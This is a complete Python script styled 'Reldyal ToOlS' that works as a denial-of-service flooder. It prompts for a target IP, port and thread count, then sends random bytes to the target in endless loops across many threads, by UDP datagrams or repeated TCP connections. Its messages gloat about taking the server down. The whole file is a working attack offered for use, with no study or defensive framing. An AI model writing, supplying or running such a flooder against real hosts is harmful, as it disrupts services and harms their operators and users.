import random
import socket
import threading

print("----Reldyal ToOlS----")
ip = str(input(" Ip:"))
port = int(input(" Port:"))
choice = str(input(" Mode(y/n):"))
times = int(input(" Packets (< 1000):"))
threads = int(input(" Threads (< 1000):"))
def run():
    data = random._urandom(1024)
    i = random.choice(("sErVeR","kOk","DoWn"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +" Reldyal pAckEt !!!")
        except:
            print("[!] Reldyal eRrOr !!!")

def run2():
    data = random._urandom(16)
    i = random.choice(("sErVeR","kOk","DoWn"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +" Reldyal pAckEt !!!")
        except:
            s.close()
            print("[*] Reldyal eRrOr !!!")

for y in range(threads):
    if choice == 'y':
        th = threading.Thread(target = run)
        th.start()
    else:
        th = threading.Thread(target = run2)
        th.start()